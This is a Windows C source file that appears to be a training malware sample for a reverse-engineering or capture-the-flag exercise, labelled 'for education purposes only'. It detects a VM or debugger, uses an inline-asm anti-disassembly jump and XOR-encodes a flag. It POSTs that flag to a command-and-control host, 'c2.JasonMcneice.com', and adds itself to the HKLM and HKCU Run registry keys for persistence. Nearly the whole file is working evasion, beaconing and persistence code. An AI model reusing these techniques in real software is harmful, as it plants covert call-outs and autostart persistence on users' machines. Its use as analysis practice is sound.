#include <windows.h>
#include <wininet.h>
#include <libloaderapi.h>
#include <string.h>
#include <debugapi.h>
#include <intrin.h>

#pragma comment(lib, "wininet.lib")

int main(void) {

    
    unsigned int cpuIDout[4];
   __cpuid(cpuIDout,1);
   
   if(cpuIDout[2] % 2 == 1)
        MessageBoxW(
            NULL,
            L"In a VM",
            L":)",
            MB_OK
            );

    if(IsDebuggerPresent()){
        MessageBoxW(
            NULL,
            L"In a debugger",
            L":)",
            MB_OK
        );
    }

    int zero = 0;
    asm(
        "xor %0, %0 \n\t"
        "jz true_branch\n\t"
        :"=r"(zero) //ignore error here
        
        
    );
    //random nonsense for code obsucation
    MessageBoxW(
        NULL,
        L"JasonMcneice_Flag1_4484",
        L":)",
        MB_OK
    );

    MessageBoxW(
        NULL,
        L"perfectly normal",
        L":)",
        MB_OK
    );
    
    MessageBoxW(
        NULL,
        L"100 and 10 persent normal",
        L":)",
        MB_OK
    );

    if(zero == 5){
        HINTERNET session = InternetOpenA(
            "thing",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL,
            NULL,
            0
        );
    
        HINTERNET connection = InternetConnectA(
            session,
            "www.yorku.ca",
            80,
            NULL,
            NULL,
            INTERNET_SERVICE_HTTP,
            0,
            0
          );
    
          
    
          HINTERNET request = HttpOpenRequestA(
            connection,
            "POST",
            "/",
            NULL,
            NULL,
            NULL,
            INTERNET_FLAG_RELOAD,
            0
          );
          InternetCloseHandle(session);
        InternetCloseHandle(connection);
            InternetCloseHandle(request);
   
    }

    

    asm("true_branch: \n\t");

    char complexFlag[69] = {98 , 79 , 70 , 70 , 69 , 10 , 71 , 88 , 10 , 105 , 24 , 10 , 89 , 79 , 88 , 92 , 79 , 88 , 10 , 93 , 79 , 10 , 66 , 75 , 92 , 79 , 10 , 76 , 69 , 95 , 68 , 78 , 10 , 94 , 66 , 79 , 10 , 94 , 75 , 88 , 77 , 79 , 94 , 4 , 10 , 96 , 75 , 89 , 69 , 68 , 103 , 73 , 68 , 79 , 67 , 73 , 79 , 117 , 108 , 70 , 75 , 77 , 24 , 117 , 30 , 30 , 18 , 30 , 42};

    MessageBoxW(
        NULL,
        L"For education purposes only.  -Jason Mcneice ",
        L":)",
        MB_OK
    );

    //connect to c2 server

    

    HINTERNET session = InternetOpenA(
        "thing",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    HINTERNET connection = InternetConnectA(
        session,
        "c2.JasonMcneice.com",
        80,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
      );

      

    HINTERNET request = HttpOpenRequestA(
        connection,
        "POST",
        "/",
        NULL,
        NULL,
        NULL,
        0,
        0
    );

    char xoredFlag[69];
    for(int i = 0;i < 69;i++)
        xoredFlag[i] = complexFlag[i] ^ 42;

    HttpSendRequest(request, NULL, 0, xoredFlag, 69);

    InternetCloseHandle(session);
    InternetCloseHandle(connection);
    InternetCloseHandle(request);

    //modify regestry

    //gets path to itself
    //gets path to itself

    char path[500];

    GetModuleFileNameA (NULL, path, 500);

    //construct command
    char command [196] = "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"notSus\" /d \"";
    strcat(command, path);
    strcat(command, "\" /f");

    //execute CMD command
    system (command);

    //construct second command

    char secondCommand[196] = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"notSus\" /d \"";

    strcat(secondCommand, path);

    strcat(secondCommand, "\" /f");

    //printf(secondCommand);

    system(secondCommand);

    




    return 0;
}